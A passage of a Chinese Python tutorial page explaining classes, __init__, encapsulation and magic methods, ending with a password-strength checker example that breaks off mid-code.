data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> score</pre></td></tr></table></figure><p>注意：特殊方法 “<strong>init</strong>” 前后分别有两个下划线！！！<br />\n注意到__init__方法的第一个参数永远是 self，表示创建的实例本身，因此，在__init__方法内部，就可以把各种属性绑定到 self，因为 self 就指向创建的实例本身。</p>\n<p>有了__init__方法，在创建实例的时候，就不能传入空的参数了，必须传入与__init__方法匹配的参数，但 self 不需要传，Python 解释器自己会把实例变量传进去：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Bart Simpson'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>name</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'Bart Simpson'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>score</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">59</span></pre></td></tr></table></figure><p>和普通的函数相比，在类中定义的函数只有一点不同，就是第一个参数永远是实例变量 self，并且，调用时，不用传递该参数。除此之外，类的方法和普通函数没有什么区别，所以，你仍然可以用默认参数、可变参数、关键字参数和命名关键字参数。</p>\n<p>数据封装<br />\n面向对象编程的一个重要特点就是数据封装。在上面的 Student 类中，每个实例就拥有各自的 name 和 score 这些数据。我们可以通过函数来访问这些数据，比如打印一个学生的成绩：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">print_score</span><span class=\"token punctuation\">(</span>std<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>     <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%s: %s'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>std<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> std<span class=\"token punctuation\">.</span>score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> print_score<span class=\"token punctuation\">(</span>bart<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Bart Simpson<span class=\"token punctuation\">:</span> <span class=\"token number\">59</span></pre></td></tr></table></figure><p>但是，既然 Student 实例本身就拥有这些数据，要访问这些数据，就没有必要从外面的函数去访问，可以直接在 Student 类的内部定义访问数据的函数，这样，就把 “数据” 给封装起来了。这些封装数据的函数是和 Student 类本身是关联起来的，我们称之为类的方法：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> score</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">print_score</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%s: %s'</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>要定义一个方法，除了第一个参数是 self 外，其他和普通函数一样。要调用一个方法，只需要在实例变量上直接调用，除了 self 不用传递，其他参数正常传入：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>print_score<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Bart Simpson<span class=\"token punctuation\">:</span> <span class=\"token number\">59</span></pre></td></tr></table></figure><p>这样一来，我们从外部看 Student 类，就只需要知道，创建实例需要给出 name 和 score，而如何打印，都是在 Student 类的内部定义的，这些数据和逻辑被 “封装” 起来了，调用很容易，但却不用知道内部实现的细节。</p>\n<p>封装的另一个好处是可以给 Student 类增加新的方法，比如 get_grade：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_grade</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'A'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'B'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'C'</span></pre></td></tr></table></figure><p>同样的，get_grade 方法可以直接在实例变量上调用，不需要知道内部实现细节：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> score<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">=</span> score</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">get_grade</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'A'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>score <span class=\"token operator\">>=</span> <span class=\"token number\">60</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'B'</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token string\">'C'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>lisa <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Lisa'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Bart'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>lisa<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> lisa<span class=\"token punctuation\">.</span>get_grade<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bart<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> bart<span class=\"token punctuation\">.</span>get_grade<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">### 输出</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>Lisa A</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>Bart C</pre></td></tr></table></figure><p>类是创建实例的模板，而实例则是一个一个具体的对象，各个实例拥有的数据都互相独立，互不影响；</p>\n<p>方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据；</p>\n<p>通过在实例上调用方法，我们就直接操作了对象内部的数据，但无需知道方法内部的实现细节。</p>\n<p>和静态语言不同，Python 允许对实例变量绑定任何数据，也就是说，对于两个实例变量，虽然它们都是同一个类的不同实例，但拥有的变量名称都可能不同：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Bart Simpson'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> lisa <span class=\"token operator\">=</span> Student<span class=\"token punctuation\">(</span><span class=\"token string\">'Lisa Simpson'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>age <span class=\"token operator\">=</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> bart<span class=\"token punctuation\">.</span>age</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> lisa<span class=\"token punctuation\">.</span>age</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'Student'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'age'</span></pre></td></tr></table></figure><h2 id=\"魔法方法\"><a class=\"anchor\" href=\"#魔法方法\">#</a> 魔法方法</h2>\n<p>很全的魔法方法总结：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tva282Ni9hcnRpY2xlL2RldGFpbHMvNDI3MDkyNzk=\">https://blog.csdn.net/koko66/article/details/42709279</span><br />\n 超详细的讲解：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzQ3\">https://www.liujiangblog.com/course/python/47</span></p>\n<h3 id=\"利用魔法方法的实例\"><a class=\"anchor\" href=\"#利用魔法方法的实例\">#</a> 利用魔法方法的实例</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># @FileName  : 密码强度检测.py</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Created    :2020/9/13 13:26</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 特征</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>NUMBER <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[0-9]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>LOWER_CASE <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[a-z]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>UPPER_CASE <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[A-Z]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>OTHERS <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[^0-9A-Za-z]'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">load_common_password</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    words <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"G:\\Text_Files\\字典\\10k_most_common.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">for</span> word <span class=\"token keyword\">in</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            words<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>word<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> words</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>COMMON_WORDS <span class=\"token operator\">=</span> load_common_password<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># 管理密码强度的类</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Strength</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    密码强度三个属性：是否有效valid, 强度strength, 提示信息message</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> valid<span class=\"token punctuation\">,</span> strength<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>valid <span class=\"token operator\">=</span> valid</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        self<span class=\"token punctuation\">.</span>strength <span class=\"token operator\">=</span> strength</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        self<span class=\"token punctuation\">.</span>message <span class=\"token operator\">=</span> message</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        1、用print去打印 实例，调用顺序是：重写的__str__方法>重写的__repr__方法>未重写的__str__方法>未重写的__repr__方法</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        2、__str__实际上是调用了__repr__</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>strength</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        如果一个类中定义了__str__()方法，那么在打印&lt;对象>时，默认输出该方法的返回值。</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>message</pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__bool__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        返回真或假</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>valid</pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Password</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token comment\"># strength</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    TERRIBLE <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    SIMPLE <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    MEDIUM <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    STRONG <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>          <span class=\"token comment\">#静态方法 类或实例均可调用</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_regular</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#改静态方法函数里不传入 self 或 cls</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        regular <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'qwertyuiop'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'asdfghjkl'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'zxcvbnm'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">input</span> <span class=\"token keyword\">in</span> regular <span class=\"token keyword\">or</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">in</span> regular</pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_by_step</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>        delta <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> delta<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_common</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">input</span> <span class=\"token keyword\">in</span> COMMON_WORDS</pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">,</span> min_length<span class=\"token operator\">=</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> min_type<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> level<span class=\"token operator\">=</span>STRONG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>        <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"83\"></td><td><pre>        如果为一个类编写了该方法，那么在该类的实例后面加括号，可会调用这个方法。</pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>        注：构造方法的执行是由类加括号执行的，即：对象 = 类名()，而对于__call__() 方法，</pre></td></tr><tr><td data-num=\"86\"></td><td><pre>        是由对象后加括号触发的，即：对象() 或者 类()()</pre></td></tr><tr><td data-num=\"87\"></td><td><pre>        '''</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> min_length<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>            <span class=\"token keyword\">return</span> Strength<span class=\"token punctuation\">(</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"terrible\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"密码太短了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>is_regular<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> self<span class=\"token 